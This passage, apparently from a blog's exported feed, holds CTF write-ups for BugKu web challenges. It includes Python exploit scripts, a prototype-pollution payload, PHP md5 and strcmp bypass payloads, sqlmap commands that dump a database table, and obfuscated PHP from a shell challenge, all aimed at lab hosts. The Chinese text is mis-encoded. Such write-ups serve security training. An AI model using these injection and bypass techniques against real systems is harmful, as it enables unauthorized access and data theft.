class="line">&#125;</span><br><span class="line">update_age = s.post(url+<span class="string">&#x27;/update&#x27;</span>,data=data)</span><br><span class="line"><span class="comment"># print(update_age.text)</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;attrkey&#x27;</span>:<span class="string">&#x27;__proto__.pwd&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;attrval&#x27;</span>:<span class="number">123</span></span><br><span class="line">&#125;</span><br><span class="line">update_info = s.post(url+<span class="string">&#x27;/update&#x27;</span>,data=data)</span><br><span class="line"><span class="comment"># print(update_info.text)</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;password&#x27;</span>:<span class="number">123</span>,</span><br><span class="line"><span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;pwd&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = s.post(url=url+<span class="string">&#x27;/getflag&#x27;</span>,data=data);</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒï¼š<a href="https://www.jianshu.com/p/2dbb1b38de1e">BugKu-Web-wp3</a></p></blockquote><h2 id="å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ"><a href="#å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ" class="headerlink" title="å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ"></a>å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ</h2><p>æ‰“å¼€ç½‘é¡µè·å¾—æºç ï¼Œæœ¬åœ°åˆ†æ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// highlight_file(&#x27;2.php&#x27;);</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>] = <span class="string">&#x27;keykeyaaaaakey:/a/keya.&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;flag&#123;********************************&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//  [[:punct:]]ä»£è¡¨ä»»ä½•æ ‡ç‚¹ç¬¦å·</span></span><br><span class="line"><span class="variable">$IM</span>= <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]), <span class="variable">$match</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$IM</span> )&#123; </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;key is: &#x27;</span>.<span class="variable">$key</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Fail!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ payloadè·å–flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13051/?id=keykeyaaaaakey:/a/keya.</span><br></pre></td></tr></table></figure><blockquote><p>æ­£åˆ™åŒ¹é…è§„åˆ™ï¼š<a href="https://www.runoob.com/regexp/regexp-rule.html">æ­£åˆ™è¡¨è¾¾å¼ - åŒ¹é…è§„åˆ™</a></p></blockquote><h2 id="å‰å¥³å‹"><a href="#å‰å¥³å‹" class="headerlink" title="å‰å¥³å‹"></a>å‰å¥³å‹</h2><p>æŸ¥çœ‹ç½‘é¡µæºç å‘ç°code.txtï¼Œè®¿é—®å³å¯è·å¾—æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$v1</span> != <span class="variable">$v2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$v3</span>, <span class="variable">$flag</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ payload</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11845/?v1=QNKCDZO&amp;v2=s878926199a&amp;v3[]=1</span><br></pre></td></tr></table></figure><h2 id="login1"><a href="#login1" class="headerlink" title="login1"></a>login1</h2><p>å°è¯•æ³¨å†Œadminç”¨æˆ·æç¤ºç”¨æˆ·åå·²ç»å­˜åœ¨ï¼Œæ•…çŒœæµ‹ç®¡ç†å‘˜è´¦å·ç”¨æˆ·åä¸ºadmin</p><p><img src="https://s2.loli.net/2022/04/27/M4C7zaomdrfwk1q.png" alt="login1_1.png"></p><p>ç»è¿‡å°è¯•å‘ç°æœªå¯¹ç©ºæ ¼è¿‡æ»¤ï¼Œæ•…åˆ›å»ºä¸€ä¸ªç”¨æˆ·åä¸º<code>â€˜admin â€™</code>ï¼ˆå³admin+ç©ºæ ¼ï¼‰çš„è´¦æˆ·ç™»å½•å³å¯</p><p><img src="https://s2.loli.net/2022/04/27/F7qpLaQ3dwZK24T.png" alt="login1_2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BugKu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu Web åˆ·é¢˜è®°å½•2</title>
      <link href="/2022/04/25/BugKu-Web2/"/>
      <url>/2022/04/25/BugKu-Web2/</url>
      
        <content type="html"><![CDATA[<h1 id="BugKu-Web-åˆ·é¢˜è®°å½•2"><a href="#BugKu-Web-åˆ·é¢˜è®°å½•2" class="headerlink" title="BugKu Web åˆ·é¢˜è®°å½•2"></a>BugKu Web åˆ·é¢˜è®°å½•2</h1><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://www.secpulse.com/archives/137663.html">BugKu-Web-wp1</a></p><p><a href="https://www.secpulse.com/archives/140522.html">BugKu-Web-wp2</a></p><p><a href="https://blog.csdn.net/weixin_46578840/article/details/120140214?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_aa&utm_relevant_index=4">get-shell-wp1</a></p><p><a href="https://blog.csdn.net/weixin_52116519/article/details/123962077">get-shell-wp2</a></p></blockquote><h2 id="æˆç»©æŸ¥è¯¢"><a href="#æˆç»©æŸ¥è¯¢" class="headerlink" title="æˆç»©æŸ¥è¯¢"></a>æˆç»©æŸ¥è¯¢</h2><p>ä½¿ç”¨sqlmapè¿›è¡Œæ³¨å…¥</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> sqlmap.py -u http://114.67.175.224:16892/ --forms --dbs</span><br></pre></td></tr></table></figure><p>å‘ç°çˆ†å‡ºæ¥å››ä¸ªæ•°æ®åº“åå­—</p><p><img src="https://s2.loli.net/2022/04/25/E9fdTwOpDxB7Y4j.png" alt="score1.png"></p><p>å…¶ä¸­skctfå¾ˆå¯ç–‘ï¼Œå»çˆ†å…¶ä¸­è¡¨å</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> sqlmap.py -u http://114.67.175.224:16892/ --forms --dbs -D skctf --tables</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/ui3TogqRI6XrKp2.png" alt="score2.png"></p><p>å¯ä»¥çŒœæµ‹ï¼Œflagå°±åœ¨f14gä¸­ï¼Œæ•…å»çˆ†å…¶ä¸­å­—æ®µ</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> sqlmap.py -u http://114.67.175.224:16892/ --forms --dbs -D skctf -T fl4g --columns</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/h5S6VBsPbtJoIHz.png" alt="score3.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œfl4gè¡¨ä¸­æœ‰ä¸€ä¸ªåä¸ºskctf_flagå­—æ®µï¼Œå¾—åˆ°å…¶å­—æ®µä¿¡æ¯å³å¯ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> sqlmap.py -u http://114.67.175.224:16892/ --forms --dbs -D skctf -T fl4g -C skctf_flag --dump</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/oerldNR6xyZ2Qu9.png" alt="score4.png"></p><h2 id="ç§‹åå±±è€å¸æœº"><a href="#ç§‹åå±±è€å¸æœº" class="headerlink" title="ç§‹åå±±è€å¸æœº"></a>ç§‹åå±±è€å¸æœº</h2><p>æ‰“å¼€ç½‘é¡µåå‘ç°éœ€è¦2ç§’å†…è®¡ç®—å‡ºç»“æœè¿”å›ï¼Œæ•…ç¼–å†™è„šæœ¬å®ç°</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://114.67.175.224:13247/&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">sess = requests.Session() <span class="comment">#ä¿æŒå½“å‰è¿æ¥ä¸æ–­</span></span><br><span class="line">response = sess.post(url=url,headers=headers)  <span class="comment">#ä¸è¦åŠ cookie</span></span><br><span class="line">response.encoding = response.apparent_encoding <span class="comment">#è‡ªåŠ¨è§£ç </span></span><br><span class="line">html_data = response.text</span><br><span class="line"><span class="comment"># print(html_data)</span></span><br><span class="line">data = re.findall(<span class="string">&#x27;&lt;div&gt;(.*)?=\?;&lt;/div&gt;&#x27;</span>,html_data)</span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line">ans = &#123;</span><br><span class="line"><span class="string">&#x27;value&#x27;</span>:<span class="built_in">eval</span>(data[<span class="number">0</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># print(ans[&#x27;value&#x27;])</span></span><br><span class="line">r = sess.post(url=url,data = ans)</span><br><span class="line">r.encoding = r.apparent_encoding <span class="comment">#è‡ªåŠ¨è§£ç </span></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/TEkaGxVD7lodf8O.png" alt="driver.png"></p><h2 id="é€Ÿåº¦è¦å¿«"><a href="#é€Ÿåº¦è¦å¿«" class="headerlink" title="é€Ÿåº¦è¦å¿«"></a>é€Ÿåº¦è¦å¿«</h2><p>æŸ¥çœ‹æºä»£ç å‘ç°è¦ä¼ é€’marginå­—æ®µ</p><p><img src="https://s2.loli.net/2022/04/25/T3p4Eu2e5ryvVdG.png" alt="fast1.png"></p><p>ä½¿ç”¨burpæŠ“åŒ…å‘ç°flagå­—æ®µ</p><p><img src="https://s2.loli.net/2022/04/25/1YRyBwiXnAOqzJv.png" alt="fast2.png"></p><p>ç„¶åç¼–å†™è„šæœ¬è¿›è¡Œpostè¯·æ±‚ä¼ é€’margin</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://114.67.175.224:16315/&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">sess = requests.Session() <span class="comment">#ä¿æŒå½“å‰è¿æ¥ä¸æ–­</span></span><br><span class="line">response = sess.get(url=url,headers=headers)</span><br><span class="line">response.encoding = response.apparent_encoding <span class="comment">#è‡ªåŠ¨è§£ç </span></span><br><span class="line">head = response.headers</span><br><span class="line"><span class="comment"># print(head[&#x27;flag&#x27;])</span></span><br><span class="line">flag = base64.b64decode(head[<span class="string">&quot;flag&quot;</span>])</span><br><span class="line">flag = flag.decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">payload = base64.b64decode(flag.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;margin&quot;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">r = sess.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>è„šæœ¬è¿è¡Œåå³å¯è·å¾—flag</p><p><img src="https://s2.loli.net/2022/04/25/EfrAC3xY6w7ZqRm.png" alt="fast3.png"></p><h2 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h2><p>è¿›å…¥åå‘ç°urlæœ‰lineå’Œfilenameä¸¤ä¸ªå‚æ•°</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:10608/index.php?line=&amp;filename=a2V5cy50eHQ=</span><br></pre></td></tr></table></figure><p>base64è§£ç <strong>a2V5cy50eHQ&#x3D;<strong>å‘ç°æ˜¯</strong>keys.txt</strong>ï¼Œæ•…å†™è„šæœ¬å°è¯•è¯»å–index.phpæºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">filename = <span class="built_in">str</span>(base64.b64encode(<span class="string">b&#x27;index.php&#x27;</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#index.phpçš„base64ç¼–ç </span></span><br><span class="line"><span class="comment"># print(filename)</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">url = <span class="string">f&#x27;http://114.67.175.224:10608/index.php?line=<span class="subst">&#123;i&#125;</span>&amp;filename=<span class="subst">&#123;filename&#125;</span>&#x27;</span></span><br><span class="line"><span class="comment"># print(url)</span></span><br><span class="line">response = requests.get(url=url)</span><br><span class="line">response.encoding = response.apparent_encoding <span class="comment">#è‡ªåŠ¨è§£ç </span></span><br><span class="line"><span class="keyword">if</span>(response.text==<span class="string">&#x27;&#x27;</span>):</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable">$line</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>])?<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>) <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line"><span class="variable">$file_list</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123; <span class="comment">//cookieå­—æ®µä¸­marginçš„å€¼ä¸ºmargin</span></span><br><span class="line"><span class="variable">$file_list</span>[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file</span>, <span class="variable">$file_list</span>))&#123;</span><br><span class="line"><span class="variable">$fa</span> = <span class="title function_ invoke__">file</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fa</span>[<span class="variable">$line</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¼–å†™exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">filename = <span class="built_in">str</span>(base64.b64encode(<span class="string">b&#x27;keys.php&#x27;</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#keys.phpçš„base64ç¼–ç </span></span><br><span class="line">url = <span class="string">f&#x27;http://114.67.175.224:10608/index.php?line=&amp;filename=<span class="subst">&#123;filename&#125;</span>&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&quot;margin&quot;</span>:<span class="string">&quot;margin&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,cookies=cookie)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>è¿è¡Œåå³å¯å¾—åˆ°flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$key</span>=<span class="string">&quot;flag&#123;99d5704e2ff0effef5f671361d5fe141&#125;&quot;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never_give_up"></a>never_give_up</h2><p>F12æŸ¥çœ‹å‘ç°1p.htmlé¡µé¢</p><p><img src="https://s2.loli.net/2022/04/25/9M8eHgKajVChkXu.png" alt="never1.png"></p><p>ç›´æ¥è·³è½¬å‘ç°ä¼šä¸€ç›´è·³è½¬åˆ°<a href="https://www.bugku.com/">BugKu</a>è¿™ä¸ªåœ°å€ï¼Œæ•…ç›´æ¥view-sourceæŸ¥çœ‹æºç </p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">view-source:http://114.67.175.224:11348/1p.html</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/vO5dgTaExQKU27w.png" alt="never2.png"></p><p>è¾“å‡ºNewWordså¾—åˆ°è§£ç åå†…å®¹</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://www.bugku.com&#x27;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°æ³¨é‡Šé‡Œè¿˜æœ‰base64ç¼–ç ï¼Œæ•…è¿›è¡Œè§£ç å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%22%3Bif(!%24_GET%5B&#x27;id&#x27;%5D)%0A%7B%0A%09header(&#x27;Location%3A%20hello.php%3Fid%3D1&#x27;)%3B%0A%09exit()%3B%0A%7D%0A%24id%3D%24_GET%5B&#x27;id&#x27;%5D%3B%0A%24a%3D%24_GET%5B&#x27;a&#x27;%5D%3B%0A%24b%3D%24_GET%5B&#x27;b&#x27;%5D%3B%0Aif(stripos(%24a%2C&#x27;.&#x27;))%0A%7B%0A%09echo%20&#x27;no%20no%20no%20no%20no%20no%20no&#x27;%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20%40file_get_contents(%24a%2C&#x27;r&#x27;)%3B%0Aif(%24data%3D%3D%22bugku%20is%20a%20nice%20plateform!%22%20and%20%24id%3D%3D0%20and%20strlen(%24b)%3E5%20and%20eregi(%22111%22.substr(%24b%2C0%2C1)%2C%221114%22)%20and%20substr(%24b%2C0%2C1)!%3D4)%0A%7B%0A%09%24flag%20%3D%20%22flag%7B***********%7D%22%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20!!!%22%3B%0A%7D%0A%0A%0A%3F%3E</span><br></pre></td></tr></table></figure><p>å†æ¬¡è¿›è¡Œurlè§£ç å³å¯å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="comment">//idä¸èƒ½ä¸ºç©º</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: hello.php?id=1&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$a</span>,<span class="string">&#x27;.&#x27;</span>)) <span class="comment">//aä¸­ä¸èƒ½å«æœ‰&#x27;.&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;no no no no no no no&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>); <span class="comment">//å¯ä»¥åˆ©ç”¨ï¼Œphp://input</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">&quot;bugku is a nice plateform!&quot;</span> <span class="keyword">and</span> <span class="variable">$id</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>)&gt;<span class="number">5</span> <span class="keyword">and</span> <span class="title function_ invoke__">eregi</span>(<span class="string">&quot;111&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;***********&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;never never never give up !!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ payloadæ”¾å…¥burpå‘é€(å‚è€ƒ<a href="https://blog.csdn.net/qq_41333578/article/details/92759619">wp</a>)</p><p><img src="https://s2.loli.net/2022/04/25/dcgGBNpu6atPL97.png" alt="never3.png"></p><h2 id="å„ç§ç»•è¿‡å“Ÿ"><a href="#å„ç§ç»•è¿‡å“Ÿ" class="headerlink" title="å„ç§ç»•è¿‡å“Ÿ"></a>å„ç§ç»•è¿‡å“Ÿ</h2><p><img src="https://s2.loli.net/2022/04/25/odAQMfma1OIHBbU.png" alt="bypass.png"></p><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/weixin_46578840/article/details/120140214?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_aa&utm_relevant_index=4">wp1</a></p><p><a href="https://blog.csdn.net/weixin_52116519/article/details/123962077">wp2</a></p></blockquote><p>å‘ç°phpæ··æ·†åçš„ä»£ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;pfkzYUelxEGmVcdDNLTjXCSIgMBKOuHAFyRtaboqwJiQWvsZrPhn&#x27;</span>, <span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span> = <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC</span> = <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">3</span>&#125; . <span 